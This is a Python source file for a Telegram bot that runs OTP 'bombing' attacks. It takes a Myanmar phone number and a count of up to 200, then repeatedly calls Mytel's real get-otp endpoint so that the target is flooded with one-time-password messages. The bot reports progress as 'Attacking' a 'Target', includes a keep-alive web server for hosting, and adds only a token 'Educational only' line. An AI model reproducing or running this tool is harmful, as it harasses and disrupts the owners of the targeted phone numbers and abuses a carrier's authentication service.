import os
import requests
import logging
from flask import Flask
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, ConversationHandler, MessageHandler, Filters

# ---------- CONFIG ----------
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise ValueError("No TELEGRAM_BOT_TOKEN set in environment")

# Conversation states
PHONE, COUNT = range(2)

# ---------- OTP Attack Logic (synchronous) ----------
def send_otp_attack(bot, update, phone, count):
    if not (phone.startswith("09") and len(phone) == 11):
        update.message.reply_text("❌ Invalid number. Must be 11 digits starting with 09 (without +95).")
        return

    url = f"https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={phone}"
    success = 0
    status_msg = update.message.reply_text(f"🚀 Attacking {phone}\nAttempts: 0/{count}")

    for i in range(1, count + 1):
        try:
            resp = requests.get(url, timeout=4)
            if resp.status_code == 200:
                success += 1
        except:
            pass
        if i % 5 == 0 or i == count:
            bot.edit_message_text(
                chat_id=update.message.chat_id,
                message_id=status_msg.message_id,
                text=f"🚀 Attacking {phone}\nAttempts: {i}/{count}\nSuccessful: {success}"
            )

    bot.edit_message_text(
        chat_id=update.message.chat_id,
        message_id=status_msg.message_id,
        text=f"✅ Finished.\nTarget: {phone}\nTotal: {count}\nSuccess: {success}\n⚠️ Educational only."
    )

# ---------- Conversation Handlers ----------
def start(update, context):
    update.message.reply_text(
        "👋 OTP Tester Bot\n/attack - Start OTP sequence\n"
        "👨‍💻 @Ace_TM0 | Myanmar Cyber Security"
    )

def attack_start(update, context):
    update.message.reply_text("📞 Send phone number (11 digits, starts with 09):")
    return PHONE

def get_phone(update, context):
    phone = update.message.text.strip()
    if not (phone.startswith("09") and len(phone) == 11 and phone.isdigit()):
        update.message.reply_text("❌ Invalid. Try again or /cancel")
        return PHONE
    context.user_data["phone"] = phone
    update.message.reply_text("🔢 How many OTP requests? (1-200):")
    return COUNT

def get_count(update, context):
    try:
        count = int(update.message.text)
        if count < 1 or count > 200:
            update.message.reply_text("Number between 1 and 200.")
            return COUNT
    except ValueError:
        update.message.reply_text("Enter a number.")
        return COUNT

    phone = context.user_data["phone"]
    update.message.reply_text(f"⏳ Starting {count} attempts on {phone}...")
    send_otp_attack(update.message.bot, update, phone, count)
    return ConversationHandler.END

def cancel(update, context):
    update.message.reply_text("Cancelled.")
    return ConversationHandler.END

# ---------- Keep-Alive Web Server (for Render) ----------
flask_app = Flask(__name__)

@flask_app.route("/")
def health():
    return "Bot is running"

def run_http_server():
    port = int(os.environ.get("PORT", 10000))
    flask_app.run(host="0.0.0.0", port=port)

# ---------- Main ----------
def main():
    # Start HTTP server in background
    Thread(target=run_http_server, daemon=True).start()

    # Set up Telegram bot (synchronous Updater)
    updater = Updater(token=TOKEN, use_context=True)
    dp = updater.dispatcher

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("attack", attack_start)],
        states={
            PHONE: [MessageHandler(Filters.text & ~Filters.command, get_phone)],
            COUNT: [MessageHandler(Filters.text & ~Filters.command, get_count)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(conv_handler)

    # Start polling
    updater.start_polling()
    print("Bot started...")
    updater.idle()

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    main()
